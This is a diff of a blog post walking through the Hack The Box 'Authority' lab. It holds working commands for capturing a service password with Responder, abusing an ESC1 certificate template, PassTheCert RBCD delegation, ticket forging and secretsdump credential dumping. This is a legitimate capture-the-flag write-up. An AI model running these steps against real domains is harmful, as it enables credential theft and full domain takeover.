@@ -1,7 +1,7 @@
 ---
 title: "Authority Walkthrough(Hack-The-Box)"
-date: 2025-04-12
-draft: false
+date: 2025-05-05
+draft: true
 description: "a description"
 tags: ["Medium", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
 ---
@@ -142,26 +142,26 @@ HOP RTT       ADDRESS
 
 ```
 - There is a web service running on port 80 which had default ISS page, I fuzzed it and found nothing.
-- I used gobuster for this fuzzing
-```
+- I used gobuster for the fuzzing
+```bash
 gobuster dir -u http://authority.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60
 ```
-![Pasted image 20250226001739.png]()
-- I tried null login and anonymous for smb and got `Access denied` errors
-![Pasted image 20250226001846.png]()
-- There is another http service is running on port `8443` , https to be precise.
+![Pasted image 20250226001739.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226001739.png?raw=true)
+- I tried null login and anonymous for smb which resulted in `Access denied` errors
+![Pasted image 20250226001846.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226001846.png?raw=true)
+- There is another http service running on port `8443` , https to be precise.
 - This web port had [PWM](https://github.com/pwm-project/pwm) service running with in it. [PWM](https://github.com/pwm-project/pwm) is an open source password self-service application for LDAP directories.
-- On opening the service I got this message prompt. Which as it mentioned now it's in configuration mode which I can make it useful
+- On opening the service I got this message prompt. Which as it mentioned now it's in configuration mode, I can make this mode useful
 - 
-![Pasted image 20250226000848.png]()
-- After clicking I can see this login  page 
-![Pasted image 20250226002653.png]()
+![Pasted image 20250226000848.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226000848.png?raw=true)
+- After clicking I can see this login page
+![Pasted image 20250226002653.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226002653.png?raw=true)
 - On clicking `Configuration Manager` I can see some sensitive information
-![Pasted image 20250226002807.png]()
+![Pasted image 20250226002807.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226002807.png?raw=true)
 - Now that I identified a user named `svc_pwm`, I can try 'em with smb
 - I got a hit and it seems that I can access  shares
-![Pasted image 20250226002953.png]()
-- So I fired up module `spider_plus` onto the shares
+![Pasted image 20250226002953.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226002953.png?raw=true)
+- So I fired up module `spider_plus` from netexec onto the shares
 ```
 {
   "Development": {
@@ -481,6 +481,7 @@ gobuster dir -u http://authority.htb/ -w /usr/share/wordlists/seclists/Discovery
 }
 
 ```
+![Thats-long](https://media1.tenor.com/m/ztAdLRcoomAAAAAC/far-too-long-richard-williams.gif)
 - Searched the files and folders for hours and found some password in the file `ansible_inventory`
 ```
 ansible_user: administrator
@@ -517,90 +518,92 @@ ldap_admin_password: !vault |
 ```
 - JohnTheRipper has a script to make hashes out of these values. Which is pretty handy.
 - Stored all the three hashes in three different files and fed it to `ansible2john` and stored the returned hashes to a file
-![Pasted image 20250226010520.png]()
+![Pasted image 20250226010520.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226010520.png?raw=true)
 - I was able to crack all three hashes, However all three turns out to be same value
-![Pasted image 20250226010745.png]()
-- Now that I got the password it's time for me to decrypt the key or values we got earlier 
-- Using pipx downloaded `ansible`
-```
+![Pasted image 20250226010745.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226010745.png?raw=true)
+- Now that I got the password it's time for me to decrypt the key or values that we got earlier 
+- Using pipx I downloaded `ansible`
+```bash
 pipx install ansible-core
 ```
 - Decrypted and got passwords from the three keys or values using the cracked password
-![Pasted image 20250226012218.png]()
-- On trying to login as `svc_pwm` with one of the password I got a error
-![Pasted image 20250226012435.png]()
+![Pasted image 20250226012218.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226012218.png?raw=true)
+- On trying to login as `svc_pwm` with one of the password, I got an error
+![Pasted image 20250226012435.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226012435.png?raw=true)
+
 ## Exploitation
 - But the password worked on `Configuration Manager`
-- I can see the appropriate domain name and some info on ldaps
-![Pasted image 20250226013045.png]()
-- From `Configuration Editor` I learnt about a new user `svc_ldap`
-![Pasted image 20250226013359.png]()
-- Also LDAP proxy password is hidden and cannot be viewed by this GUI. In theory on changing the ldap url with my ip and the protocol to `ldap` I can get the password
-- Changed the`LDAP URLs` to  `ldap://10.10.14.16:389`
-![Pasted image 20250226014717.png]()
+- Now I can see the appropriate domain name and some info on ldaps
+![Pasted image 20250226013045.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226013045.png?raw=true)
+- From `Configuration Editor` I learnt about another user `svc_ldap`
+![Pasted image 20250226013359.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226013359.png?raw=true)
+- Also LDAP proxy password is hidden and cannot be viewed in this GUI. In theory on changing the ldap url with my ip and the protocol to `ldap` I can get the password in clear text
+- I Changed the`LDAP URLs` to  `ldap://10.10.14.16:389`
+![Pasted image 20250226014717.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226014717.png?raw=true)
 - On other side opened Responder
-```
+```bash
 sudo responder -I tun0
 ```
 - Got the password 
-![Pasted image 20250226014855.png]()
+![Pasted image 20250226014855.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226014855.png?raw=true)
 - This password works for the user `svc_ldap` and the user has both `smb` and `winrm` permission.
 - Got the user flag
-![Pasted image 20250226015623.png]()
+![Pasted image 20250226015623.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226015623.png?raw=true)
+
 ## Privilege Escalation
 - When I run certipy for to enumerate ADCS, the output shows that there is a vulnerable template called `CorpVpn` . This template paves the path for us to exploit ESC1.
-![Pasted image 20250226164410.png]()
+![Pasted image 20250226164410.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226164410.png?raw=true)
 - I can exploit this by adding a computer and requesting a certificate for `upn:` `administrator` 
-- **Abusing ESC1:**
+### Abusing ESC1:
 	- I have to enumerate for computers, The setting that allows a user to add a computer to the domain is the `ms-ds-machineaccountquota`
 	- The same we have done earlier in [[2.4-Support]]  box. I can enumerate for this using `netexec` using module `maq` 
-```
+```bash
 netexec ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
 ```
-![Pasted image 20250226165046.png]()
+![Pasted image 20250226165046.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226165046.png?raw=true)
 - Now I can add a new computer to the dc using `addcomputer` a impacket's tool
-```
+```bash
 addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name Emp5r0R -computer-pass 'Password123!' -dc-ip 10.10.11.222
 ```
-![Pasted image 20250226165435.png]()
+![Pasted image 20250226165435.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226165435.png?raw=true)
 - Here I added a computer named `Emp5r0R` to the DC now I can request certificate for `administrator` as computer `Emp5r0R` 
-```
+```bash
 certipy req -username 'Emp5r0R$' -password 'Password123!' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
 ```
-![Pasted image 20250226165452.png]()
+![Pasted image 20250226165452.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226165452.png?raw=true)
 - I tried to authenticate with the certificate but It failed
-```
+```bash
 certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222
 ```
-![Pasted image 20250226165559.png]()
+![Pasted image 20250226165559.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226165559.png?raw=true)
 - Apparently,it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”
 - To workaround this I can use something like `passthecert`attack but for that I need the certificate and  key separately. I can extract the same with certipy
 - Getting key:
-```
+```bash
 certipy cert -pfx administrator_authority.pfx -nocert -out admin.key
 ```
-![Pasted image 20250226170303.png]()
+![Pasted image 20250226170303.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226170303.png?raw=true)
 - Getting Certificate:
-```
+```bash
 certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt
 ```
-![Pasted image 20250226170337.png]()
+![Pasted image 20250226170337.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226170337.png?raw=true)
 - Now I can give `write_rbcd` permission to my computer using the certificate and key of user `administrator`
 - *RBCD: RBCD allows a _service_ (running on a computer account) to impersonate users _only to specific other services_ on _other_ computers. Unlike traditional constrained delegation (which specifies _who_ can delegate _to_ a service), RBCD focuses on _which services a computer can access_ on behalf of users. The key is the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object.*
 - This tool [passthecert](wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py) made this attack easy for me . Using this tool I assigned RBCD permission to `Emp5r0R$`.
-```
+```bash
 python3 passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'Emp5r0R$' -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222
 ```
-![Pasted image 20250226214527.png]()
+![Pasted image 20250226214527.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226214527.png?raw=true)
 - Synced the time before getting TGT `sudo ntpdate authority.htb`
 - Now I can impersonate the user `administrator`using my computer
-```
+```bash
 getST.py -spn 'cifs/authority.authority.htb' -impersonate 'Administrator' 'authority.htb/Emp5r0R:Password123!'
 ```
-![Pasted image 20250226214753.png]()
+![Pasted image 20250226214753.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226214753.png?raw=true)
 - Exported the ticket `export KRB5CCNAME=Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache`
 - Now that I have TGT of user administrator I can do secretsdump
-```
+```bash
 secretsdump.py -k -no-pass 'authority.htb/administrator@authority.authority.htb'
 ```
 - Got the dumps successfully
@@ -655,4 +658,8 @@ AUTHORITY$:des-cbc-md5:ef4c23d5e9bfea4a
 <SNIP>
 ```
 - Logged in using `evil-winrm` and got the root flag
-![Pasted image 20250226215544.png]()
+![Pasted image 20250226215544.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250226215544.png?raw=true)
+
+{{< typeit >}} I know it's been long since my last post, The resason is Hugo had an recently which caused some issues within my site build. Anyway This is a very good box, I learnt a lot. I'll see you guys again like old times with regular posts, bye. {{< /typeit >}}
+
+![bye](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExb3ZjdjQxcnB0YXBqYXV0NnA0dzI4YWoxeTJidm1jNWpxaWhtZGxsMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/fNqodJNdEUrP65RYDT/giphy.gif)
